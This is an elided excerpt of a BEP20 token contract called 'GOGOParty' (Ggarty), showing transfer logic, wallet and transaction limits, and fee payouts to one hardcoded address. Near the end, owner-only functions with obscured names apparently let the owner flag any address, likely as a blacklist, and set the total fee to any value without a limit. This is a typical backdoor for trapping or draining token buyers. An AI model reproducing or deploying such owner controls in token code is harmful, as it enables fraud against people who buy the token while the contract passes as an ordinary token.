...
contract Ggarty  is IBEP20, Auth {
    ...
    string constant _name = "GOGOParty";
    string constant _symbol = "Ggarty";
    ...
    address private marketingFeeReceiver = 0xDea7F1bA8Db74F3181599F70B283727d1519c6aF;
    address private buybackFeeReceiver = 0xDea7F1bA8Db74F3181599F70B283727d1519c6aF;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Ggarty Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Ggarty Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Ggarty Transfer amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Ggarty TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Ggarty receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
        require(BuyBackSuccess, "Ggarty receiver rejected ETH transfer");
    ...
    function setDLGgarty(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEGgarty(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Ggarty Can't let you take all native token");
